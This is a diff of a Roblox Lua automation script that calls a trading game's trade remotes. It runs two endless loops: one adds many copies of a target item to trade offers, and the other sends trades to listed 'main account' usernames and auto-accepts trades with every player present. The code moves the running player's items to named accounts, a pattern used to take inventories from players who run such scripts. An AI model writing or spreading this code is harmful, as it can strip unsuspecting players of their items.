@@ -2,47 +2,16 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+ 
+-- =================================================
+
+local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
-local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
 
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
-
-local function sendTradeRequest(playerName)
-	local targetPlayer = Players:FindFirstChild(playerName)
-	if not targetPlayer then
-		warn("Player not found in server: " .. playerName)
-		return
-	end
-	
-	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
-		sendTradeRemote:FireServer(targetPlayer)
-		print("Successfully sent trade request to: " .. playerName)
-	else
-		warn("TradeAPI/SendTradeRequest RemoteEvent could not be located.")
-	end
-end
-
-local function acceptTradeForAll()
-	for _, targetPlayer in ipairs(Players:GetPlayers()) do
-		if targetPlayer ~= Players.LocalPlayer then
-			local args = {
-				targetPlayer,
-				true
-			}
-
-			local success, err = pcall(function()
-				return tradeFunction:InvokeServer(unpack(args))
-			end)
-
-			if success then
-				print("Successfully processed trade request for: " .. targetPlayer.Name)
-			end
-		end
-	end
-end
 
 local function getMultipleUniqueIdsByName(itemName, limit)
 	if not successClientData or not ClientData then
@@ -68,23 +37,58 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 	return uniqueIds
 end
 
--- Single execution without the loop
-while true do
-	local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
-
-	for _, uniqueId in ipairs(uniqueIds) do
-		pcall(function()
-			addItemRemote:FireServer(uniqueId)
-		end)
+local function sendTradeRequest(playerName)
+	local targetPlayer = Players:FindFirstChild(playerName)
+	if not targetPlayer then
+		warn("Player not found in server: " .. playerName)
+		return
 	end
-
-	-- Adjust the delay (in seconds) between each loop cycle as needed
-	task.wait(2) 
+	
+	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
+		sendTradeRemote:FireServer(targetPlayer)
+		print("Successfully sent trade request to: " .. playerName)
+	else
+		warn("TradeAPI/SendTradeRequest RemoteEvent could not be located.")
+	end
 end
 
+local function acceptTradeForAll()
+	for _, targetPlayer in ipairs(Players:GetPlayers()) do
+		if targetPlayer ~= LocalPlayer then
+			local args = {
+				targetPlayer,
+				true
+			}
+
+			local success, err = pcall(function()
+				return tradeFunction:InvokeServer(unpack(args))
+			end)
+
+			if success then
+				print("Successfully processed trade request for: " .. targetPlayer.Name)
+			end
+		end
+	end
+end
+
+-- Task to handle adding items in a continuous loop (from to.txt)
 task.spawn(function()
 	while true do
-		-- Only loop if names are provided and not empty
+		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
+
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				addItemRemote:FireServer(uniqueId)
+			end)
+		end
+
+		task.wait(2) 
+	end
+end)
+
+-- Task to handle trade requests and auto-accepting (from here.txt)
+task.spawn(function()
+	while true do
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
 				if Players:FindFirstChild(playerName) then
